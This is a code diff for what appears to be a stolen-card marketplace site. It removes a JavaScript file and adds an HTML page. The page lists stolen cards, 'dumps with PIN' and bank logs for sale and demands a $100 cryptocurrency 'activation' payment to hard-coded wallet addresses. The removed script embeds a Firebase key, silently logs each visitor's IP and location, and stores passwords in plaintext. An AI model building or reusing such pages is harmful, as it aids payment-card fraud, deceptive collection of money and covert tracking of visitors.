@@ -1,511 +1,228 @@
-var menuChecker, RANDOM_NUMBER;
-var random;
-var max = 5;
-var TOPUPBTCWITH, LOGOUT_USER_ID;
-var IPCOUNTRY, USA_DATE, GH_DATE;
-var IPCODE, IP_CITY,IP_COUNTRY,IP_REGION;
-var ACCOUNT_LOG, LOGOUT_DIR; 
-var logout_id;
+<!DOCTYPE html>
+<html>
+  <head>
+    <!--Import Google Icon Font-->
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
+    <!--Import materialize.css-->
+    <link type="text/css" rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css"  media="screen,projection"/>
+    <link rel="icon" href="god.png">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
 
-//SECURITY
-var WHOAREYOU, TODAY_DATE;
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=KoHo:wght@200&display=swap" rel="stylesheet">
+    <!-- Compiled and minified JavaScript -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/js/materialize.min.js"></script>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
 
-$(document).ready(function(){
-    const firebaseConfig = {
-        apiKey: "AIzaSyDG0pZ0F72PZjXUubKS9Ouz9cfPp1Mac4k",
-        authDomain: "diplomaticshipping-f0081.firebaseapp.com",
-        databaseURL: "https://diplomaticshipping-f0081.firebaseio.com",
-        projectId: "diplomaticshipping-f0081",
-        storageBucket: "diplomaticshipping-f0081.firebasestorage.app",
-        messagingSenderId: "68319995710",
-        appId: "1:68319995710:web:2015360134e41b2b5fae6f"
-      };
-       // Initialize Firebase
-         firebase.initializeApp(firebaseConfig);
-
+    <script src="https://www.gstatic.com/firebasejs/7.24.0/firebase-app.js"></script>
+        <script src="https://www.gstatic.com/firebasejs/7.24.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/7.24.0/firebase-firestore.js"></script>
     
+    <link rel="stylesheet" href="GOD.css">
+  </head>
 
-        moveToLogin();
-        GETCURRENTDATE();
-        getUserIpAddress_2();
+  <body>
 
-        random_number_security();
+    <div class="loginPage">
+        <div class="loginInputBox">
+            <form>
+                <input type="text"  id="email_log" placeholder="E-MAIL">
 
-        $('#btc-summ1').text('0.0026 BTC');
+                <input type="text"  id="password_log" placeholder="PASSWORD">
 
-        findRandom();
-         
-      
-});
+                <input type="text" class="repeat_password_log"  id="repeat_password_log" placeholder="REPEAT PASSWORD">
 
-// MAY 2023
-function BTC_CHECKER_COUNTER(){
-    console.log('BTC COUNTER:  ----');
-    var db = firebase.firestore();
+                <div class="captionBx" id="captionBX1">
+                    <img id="captureImg" src="veri.png" alt="">
+                </div>
 
-    db.collection("BTC").doc('COUNTER').get().then(function(doc) {
-        if (doc.exists) {
-            console.log("BTC DOC  exists");
-            // 
-                if (doc.data().number == '1') {
-                   console.log('BTC ADDY SHOW 1 -- 8zyy');
-                   security_protector();
-                    // update account with btc address
-                    var docRef = db.collection("BTC").doc('COUNTER');
+                <br>
+                <input type="text" id="capture" placeholder="CAPTCHA">
+                <p id="login_error"></p>
+                <br>
 
-                    docRef.update({
-                        number: '2'
-                    })
-                    .then(function() {
-                        console.log("btc admin successfully updated!");
-                    })
-                    .catch(function(error) {
-                        console.error("Error updating btc admin: ", error);
-                    });
-                }
-                if (doc.data().number == '2') {
-                    console.log('BTC ADDY SHOW 2-- sWh1s');
-                    security_protector_1();
-                     // update account with btc address
-                     var docRef = db.collection("BTC").doc('COUNTER');
- 
-                     docRef.update({
-                         number: '3'
-                     })
-                     .then(function() {
-                         console.log("btc admin successfully updated!");
-                     })
-                     .catch(function(error) {
-                         console.error("Error updating btc admin: ", error);
-                     });
-                }
-                if (doc.data().number == '3') {
-                    console.log('BTC ADDY SHOW 3 ---CVn2pW ');
-                    security_protector_2();
-                     // update account with btc address
-                     var docRef = db.collection("BTC").doc('COUNTER');
- 
-                     docRef.update({
-                         number: '1'
-                     })
-                     .then(function() {
-                         console.log("btc admin successfully updated!");
-                     })
-                     .catch(function(error) {
-                         console.error("Error updating btc admin: ", error);
-                     });
-                 }
+                <div class="btnGROUP">
+                    <a onclick="registerUser();" class="teal btn register_btn">
+                        Register
+                    </a>
 
-        } else {
-            console.log("BTC DOC does not exist");
-            // 
-        }
-    }).catch(function(error) {
-        console.log("Error getting document:", error);
-    });
-}
+                    <p class="EG_verify red-text"></p>
+                    <a onclick="login();" class="login_btn green btn">
+                        Login
+                    </a>
+                    <a onclick="moveToLogin();" class="green btn move_to_login_btn">
+                       Back to Login
+                    </a>
 
-function security_protector(){
-   
-        // Your code here
-        $('#btc_wallet1').text('');
-        $('#btc_wallet1').text('1Q3Hmhg4gCif8ny4PwxTk5Lzd4aKd2FRcu');
-        // console.log('btc-wallet1ROTECTOR_GOD: '+ $('#btc_wallet1').text());    
-}
-
-function security_protector_1(){
-   
-        // Your code here
-        $('#btc_wallet1').text('');
-        $('#btc_wallet1').text('1Q3Hmhg4gCif8ny4PwxTk5Lzd4aKd2FRcu');
-        // console.log('btc-wallet1ROTECTOR_GOD: '+ $('#btc_wallet1').text());
-    
-}
-
-function security_protector_2(){
-   
-        // Your code here
-        $('#btc_wallet1').text('');
-        $('#btc_wallet1').text('1Q3Hmhg4gCif8ny4PwxTk5Lzd4aKd2FRcu');
-        // console.log('btc-wallet1ROTECTOR_GOD: '+ $('#btc_wallet1').text());
-    
-}
-
-
-
-
-  function BITCOIN_REGISTER(){
-    var sum_amount = $("#btc-summ1").text();
-    var btc_address = $("#btc_wallet1").text();
-    var userid = ACCOUNT_LOG;
-
-    console.log("btc transaction!");
-
-    // BITCOIN ADDED
-    var db= firebase.firestore();
-    db.collection("TRANSACTIONS").doc(userid).set({
-        amount: sum_amount,
-        btc_address_used: btc_address,
-        timestamp: firebase.firestore.FieldValue.serverTimestamp(),
-        STATUS: 'unconfirmed',
-        username: userid,
-    })
-    .then(() => {
-        console.log("transaction successfully written!");
-    })
-    .catch((error) => {
-        console.error("Error writing transaction: ", error);
-    });
-
-  }
-
-  function moveToRegister(){
-    $('.login_btn').hide();
-    $('.repeat_password_log').removeClass('hide');
-    $('.move_to_login_btn').show();
-    $('.move_to_register_btn').hide();
-    $('.register_btn').show();
-  }
-  function moveToLogin(){
-    $('.register_btn').hide();
-    $('.move_to_login_btn').hide();
-    $('.repeat_password_log').addClass('hide');
-    $('.login_btn').show();
-    $('.move_to_register_btn').show();
-  }
-
-function registerUser(){
-    var email, password;
-    email = $('#email_log').val().toLowerCase();
-    console.log('EMAIL:::; '+ email);
-
-    password = $('#password_log').val();
-        if (email != '' && password != '') {
-            $('.login_btn').addClass('hide');
-            firebase.firestore().collection("accounts").doc(email+password).set({
-                email: email,
-                password: password
-            })
-            .then((docRef) => { 
-                console.log("ACCOUNT CREATED: ");
-                $('.loginPage').addClass('hide');
-                $('.GOD_ACCOUNT').removeClass('hide');
-                ACCOUNT_LOG = email + password;
-                getUserIpAddress();
-                $('.GOD_BTC').addClass('hide');
-                setTimeout(
-                    function(){
-                       // $('.GOD_BTC').removeClass('hide');
-                    },1500
-                );
-            })
-            .catch((error) => {
-                $('.login_btn').removeClass('hide');
-                console.error("Error adding document: ", error);
-                alert('Registration failed. Try again...');
-                setTimeout(
-                    function(){
-                        location.reload();
-                    },3000
-                );
-            });
-        }else{
-            alert('Incorrect username/password...');
-        }
-}
-function openAccount(){
-    $('.loginPage').addClass('hide');
-    $('.GOD_ACCOUNT').removeClass('hide');
-    $('.GOD_BTC').addClass('hide');
-    setTimeout(
-        function(){
-            //$('.GOD_BTC').removeClass('hide');
-        },1500
-    );
-}
-function login(){
-    var email, password;
-    email = $('#email_log').val().toLowerCase();
-    console.log('EMAIL:::; '+ email);
-    password = $('#password_log').val();
-    // VALIDATE EMAIL
-    var emailReg = /^([\w-\.]+@([\w-]+\.)+[\w-]{2,4})?$/;
-    if( !emailReg.test( email ) ) {
-        console.log('THIS IS NOT AN EMAIL');
-        $('#login_error').text('Enter a valid email address...');
-        setTimeout(() => {
-         $('#login_error').text('');
-        }, 4666);
-        
-    } else {
-        $('#login_error').text('');
-        console.log('THIS IS AN EMAIL');
-        if (email != '' && password != '') {
-            $('.login_btn').addClass('hide');
-            var docRef = firebase.firestore().collection("accounts").doc(email+password);
-    
-            docRef.get().then((doc) => {
-                if (doc.exists) {
-                    console.log("USERNAME data:", doc.data());
-                    // MAY 2023
-                    BTC_CHECKER_COUNTER();
-                    openAccount(); 
-                    ACCOUNT_LOG = email + password;
-                    getUserIpAddress();
-                } else {
-                    // doc.data() will be undefined in this case
-                    console.log("No such document for: !", email+password);
-                    $('.login_btn').removeClass('hide');
-                    alert('No account can be found with this logins, register for a new account...');
-                    //CANT FIND USER - CREATE A NEW ACCOUNT OR TRY AGAIN WITH THE CORRECT LOGINS
+                    <br>
                     
-                }
-            }).catch((error) => {
-                console.log("Error getting document for: ", error);
-                
-                setTimeout(
-                    function(){
-                        $('.EG_verify').text('Your account cannot be found please try again or register for  a new account.');
-                    },10000
-                );
-            });
-        }else{
-            alert('Incorrect username/password...');
-        }
+
+                    <a onclick="moveToRegister()" class="teal btn move_to_register_btn">
+                        Move to Register
+                    </a>
+                    
+                </div>
+            </form>
+        </div>
+    </div>
+
+
+    <div class="GOD_ACCOUNT hide">
         
-    }
-}
-
-function validateEmail(){
-    if (email != '' && password != '') {
-        $('.login_btn').addClass('hide');
-        var docRef = firebase.firestore().collection("accounts").doc(email+password);
-
-        docRef.get().then((doc) => {
-            if (doc.exists) {
-                console.log("USERNAME data:", doc.data());
-                BTC_CHECKER_COUNTER();// may 2023
-
-                openAccount(); 
-                ACCOUNT_LOG = email + password;
-                getUserIpAddress();
-            } else {
-                // doc.data() will be undefined in this case
-                console.log("No such document for: !", email+password);
-                $('.login_btn').removeClass('hide');
-                alert('No account can be found with this logins, register for a new account...');
-                //CANT FIND USER - CREATE A NEW ACCOUNT OR TRY AGAIN WITH THE CORRECT LOGINS
-                
-            }
-        }).catch((error) => {
-            console.log("Error getting document for: ", error);
+        <div class="x_bx_50 x_bx_50a" id="menu_bx">
+            <ul class="nav flex-column product_li_bx">
+                <li class="nav-item"><a class="nav-link active" onclick="showBTC();">Control panel </a></li>
+                <li class="nav-item"><a class="nav-link active" onclick="showBTC();" >Buy cc </a></li>
+                <li class="nav-item"><a class="nav-link active" onclick="showBTC();" >Dumps buy </a></li>
+                <li class="nav-item"><a class="nav-link active" onclick="showBTC();" >Dump+Pin, CC+cvv </a></li>
+                <li class="nav-item"><a class="nav-link active" onclick="showBTC();" >Account </a></li>
+                <li class="nav-item"><a class="nav-link active" onclick="showBTC();" >Sell bd </a></li>
+                <li class="nav-item"><a class="nav-link active" onclick="showBTC();" >Buy Fresh Bank Logs </a></li>
+                <li class="nav-item"><a class="nav-link active" onclick="showBTC();" >Create ticket </a></li>
+                <li class="nav-item"><a class="nav-link active" onclick="showBTC();" >Checker free </a></li>
+               
+            </ul>
+        </div>
+        <div class="x_bx_50" id="x_bx_51">
+            <div class="GOD_BTC">
             
-            setTimeout(
-                function(){
-                    $('.EG_verify').text('Your account cannot be found please try again or register for  a new account.');
-                },4000
-            );
-        });
-    }else{
-        alert('Incorrect username/password...');
-    }
-}
-
-function getBTCADDRESS(){
-    $('#btc-summ1').text('0.0026 BTC');
-    $('#btc_wallet1').text('1NZvR7nPnW18P5V1gaBBgpNvLn8M1Qx5qj');
-}
-function get_eth(){
-    $('#btc-summ1').text('0.039 ETH');
-    $('#btc_wallet1').text('0xe9216aDd6c02BA2c07081917B6913e1CFA83e38C');
-}
-function get_ltc(){
-    $('#btc-summ1').text('0.686 LTC');
-    $('#btc_wallet1').text('MWYDrtxwRiCDDtGemt1FDhhR1ydWkEv7o7');
-}
-
-function copyToClipboard() {
-    // Create a "hidden" input
-  var aux = document.createElement("input");
-
-  // Assign it the value of the specified element
-  aux.setAttribute("value", document.getElementById('btc-wallet1').innerHTML);
-  //aux.setAttribute('value','')
-  // Append it to the body
-  document.body.appendChild(aux);
-
-  // Highlight its content
-  aux.select();
-
-  // Copy the highlighted text
-  document.execCommand("copy");
-
-  // Remove it from the body
-  document.body.removeChild(aux);
-  $('.blockchain_btn').hide();
-  M.toast({html: 'COPIED'});
-  setTimeout(
-      function(){
-        $('.blockchain_btn').show();
+                <div class="payment-form-container">
+                    <i class="white-text material-icons close_btc_btn" onclick="hideBTC();">close</i>
+                    <div class="payment_ui_0">
+                        <div class="payment-form-header">
+                            <h4>Your account is inactive!</h4>
+                            
+                            <div>For activation you need to top up your balance with the minimum amount of <strong><b>$100</b></strong><br>
+                            &nbsp;
+                            <center>This activation sum will be added to your balance, so you won’t lose a cent.<br>
+                            <br>
+                            Attention: Accounts that are not activated for more than 10 days will be deleted automatically.<br>
+                            <br>
+                            They will be added to your balance automatically.<br>
+                            NB! This operation takes about 10-15 minutes.</center>
+                            </div>
+                        </div>
+                        
+                        <div class="img_bx" style="display: none;">
+                            <img src="api_bitcoin.gif" alt="" onclick="getBTCADDRESS(); BITCOIN_REGISTER();">
+                            <img src="eth.png" alt="" onclick="get_eth(); BITCOIN_REGISTER()">
+                            <img src="ltc.png" alt="" onclick="get_ltc(); BITCOIN_REGISTER()">
+                        </div>
         
-      },2000
-  );
-}
-
-function insertData(ip,city,region,country,directory){
+                        <div class="blockchain hide">
+                            <div class="payment-form-info-block">
         
-        firebase.firestore().collection("CLIENTS").doc(ip+country+"_"+city).set({
-            client_ip: ip,
-            client_region: region,
-            client_city: city,
-            country: country,
-            account: directory
-        })
-        .then(() => {
-            console.log("Document successfully written!");
-        })
-        .catch((error) => {
-            console.error("Error writing document: ", error);
-        });                                     
-}
+                            </div>
+                        </div>
+                        <br>
+                        <div class="add-bl" id="payment-btcdd" style="">
+                            <div class="payment-form-info-block">
+                            <div class="btc-info-bit"><span id="btc-summ-to-pay" class="black-text">Sum:</span>
+                            
+                            <div><span id="btc-summ1" onclick="copytext('#btc-summ1')" style="cursor: pointer;"></span> </div>
+                            </div>
+                            </div>
+                            
+                            <div class="btc-rate"></div>
+                            
+                            <div class="payment-form-info-block">
+                            <div class="btc-info-bit">Address: 1GYcLLvB4d3aNWA9PCHHkvDxzVuvCn1uTw
+                            <div><span id="btc_wallet1" onclick="copyToClipboard(); BITCOIN_REGISTER();" style="cursor: pointer;"></span></div>
+                            </div>
+                            </div>
+                        </div>
+                        
+                        <div class="blockchain_btn">
+                            <a class="btn green">Verify Payment</a>
+                            <br><br>
+                            <a class="btn yellow black-text">Waiting for payment</a>
+                        </div>
+                    </div>
 
-function getUserIpAddress(){
-    $.getJSON("https://api.ipify.org/?format=json", function(e) {
-    console.log("USER IP: "+e.ip);
-    if (e.ip != "") {
-        $.get("https://ipinfo.io", function(response) {
-            IPCODE = response.ip;
-            IP_CITY = response.city;
-            IP_COUNTRY = response.country;  
-            IP_REGION = response.region; 
-            logout_id = IPCODE + IP_COUNTRY +"_"+IP_CITY;
-            // alert("Log ID: "+logout_id);
-        console.log("Country of origin: "+response.city, response.country);
-        if (IP_COUNTRY != '') {
-            insertData(IPCODE,IP_CITY,IP_REGION,IP_COUNTRY,ACCOUNT_LOG);
-        }else{
-            console.log("Can't get User Information...");
-        }
-      }, "jsonp");
-      return e.ip;
-    }
-  });
-}
-function getUserIpAddress_2(){
-    $.getJSON("https://api.ipify.org/?format=json", function(e) {
-    console.log("USER IP: "+e.ip);
-    if (e.ip != "") {
-      
-      $.get("https://ipinfo.io", function(response) {
-        IPCODE = response.ip;
-        IP_CITY = response.city;
-        IP_COUNTRY = response.country;  
-        IP_REGION = response.region; 
-        console.log("Country of origin: "+response.city, response.country);
-        if (IP_COUNTRY != '') {
-            SECURITY(IPCODE);
-        }else{
-            console.log("Can't get User Information...");
-        }
-      }, "jsonp");
-      return e.ip;
-    }
-  });
-}
-
-function SECURITY(ip){
-    var account_dir;
-    firebase.firestore().collection("CLIENTS").where("client_ip", "==", ip)
-    .get()
-    .then((querySnapshot) => {
-        querySnapshot.forEach((doc) => {
-            account_dir = doc.data().account;
-            LOGOUT_DIR = doc.id;
-            FIND_CLIENT_ACC(account_dir);
-            console.log(doc.id, " CLIENT IP MATCHED=> ", doc.data());
-            BTC_CHECKER_COUNTER();
-            logout_id = doc.id;
-           // alert("Log ID: "+logout_id);
-            
-        });
-    })
-    .catch((error) => {
-        console.log("Error getting CLIENT IP: ", error);
-    });
-}
-function FIND_CLIENT_ACC(dir){
-    var docRef = firebase.firestore().collection("accounts").doc(dir);
-
-    docRef.get().then((doc) => {
-        if (doc.exists) {
-            console.log("USERNAME data:", doc.data());
-            openAccount(); 
-            ACCOUNT_LOG = dir;
-        } else {
-            // doc.data() will be undefined in this case
-            console.log("No such document for: !", dir);
-            $('.login_btn').removeClass('hide');
-            //alert('No account can be found with this logins, register for a new account...');
-            //CANT FIND USER - CREATE A NEW ACCOUNT OR TRY AGAIN WITH THE CORRECT LOGINS
-            
-        }
-    }).catch((error) => {
-        console.log("Error getting document for: ", error);
-    });
-}
-
-function LOGOUT(){
+                    <div class="payment_ui_1 hide">
+                        <div class="preloader-wrapper big active">
+                            <div class="spinner-layer spinner-blue-only">
+                              <div class="circle-clipper left">
+                                <div class="circle"></div>
+                              </div><div class="gap-patch">
+                                <div class="circle"></div>
+                              </div><div class="circle-clipper right">
+                                <div class="circle"></div>
+                              </div>
+                            </div>
+                          </div>
+                    </div>
+                </div>
     
-    var db = firebase.firestore();
-    db.collection("CLIENTS").doc(logout_id).delete().then(() => {
-        console.log("Document successfully deleted!");
-        location.reload();
-    }).catch((error) => {
-        console.error("Error removing document: ", error);
-        location.reload();
-    });
-}
+                    
+            </div>
+            <header>
+                <a class="grey btn LOGOUT" onclick="showBTC();">Add Balance</a>
+                <a><span>Balance:</span> 0.00$</a>
+                <a><span>Account:</span> inactive</a>
+                <a class="green btn LOGOUT" onclick="LOGOUT();">LOG OUT</a>
+            </header>
+            <br><br>
+            <div class="product_bx">
 
-function random_number_security(){
-    var num = Math.floor(Math.random() * 4 + 1);
-    console.log(num);
-}
+                <h4>News</h4>
 
-function showBTC(){
-    $('.GOD_BTC').removeClass('hide');
-} 
-function hideBTC(){
-    $('.GOD_BTC').addClass('hide');
-}
+                <table class="striped">
+                    <thead>
+                      <tr id="tbl_underline">
+                          <th>Date</th>
+                          <th>New update</th>
+                      </tr>
+                    </thead>
+            
+                    <tbody>
+                        <tr>
+                            <td class='cDate'>2022-08-02</td>
+                            <td>Dumps Added !</td>
+                        </tr>
+                        <tr>
+                            <td class='cDate'>2022-08-02</td>
+                            <td>CC Added !</td>
+                        </tr>
+                        <tr>
+                            <td class='cDate'>2022-08-02</td>
+                            <td>Unprecedented Updates, Hot Work for the week!</td>
+                        </tr>
+                        <tr>
+                            <td class='cDate'>2022-08-02</td>
+                            <td>Prominent Update of Pure World Virginity</td>
+                        </tr>
+                        <tr>
+                            <td class='cDate'>2022-08-02</td>
+                            <td>Bank logs Added!!</td>
+                        </tr>
+                        <tr>
+                            <td class='cDate'>2022-08-02</td>
+                            <td>Update mix cc usa bd</td>
+                        </tr>
+                        <tr>
+                            <td class='cDate'>2022-08-02</td>
+                            <td>802 mix cc usa bd</td>
+                        </tr>
+                        <tr>
+                            <td class='cDate'>2022-08-02</td>
+                            <td>Add dump + pin 108 cards</td>
+                        </tr>
+                        <tr>
+                            <td class='cDate'>2022-08-02</td>
+                            <td>+3.4k mix euro cc</td>
+                        </tr>
+                    </tbody>
+                </table>
+            </div>
+        </div>
+    </div>
 
-function GETCURRENTDATE(){
-    var d = new Date();
 
-    var month = d.getMonth()+1;
-    var day = d.getDate();
-    var hr = d.getHours();
-    var mins = d.getMinutes();
-    
-    var outputt = (day<10 ? '0' : '') + day+ '-' +
-        (month<10 ? '0' : '') + month + '-' +
-        d.getFullYear();
 
-        var output = d.getFullYear() + '-' +
-        (month<10 ? '0' : '') + month + '-' +
-        (day<10 ? '0' : '') + day;
-
-        TODAY_DATE=output;
-
-        $('.cDate').text(TODAY_DATE);
-        $('.cDate').text(TODAY_DATE);
-        console.log('Todays date: ' + TODAY_DATE);
-}
-
-function findRandom() {
-    var max = 3;
-
-    var random = Math.floor(Math.random() * max); //Finds number between 0 - max
-    console.log(random);
-  
-    $('#captureImg').attr("src",+random+ '.png');
-  }
+    <!--JavaScript at end of body for optimized loading-->
+    <script src="GOD.js"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/materialize/1.0.0/css/materialize.min.css"></script>
+  </body>
+</html>
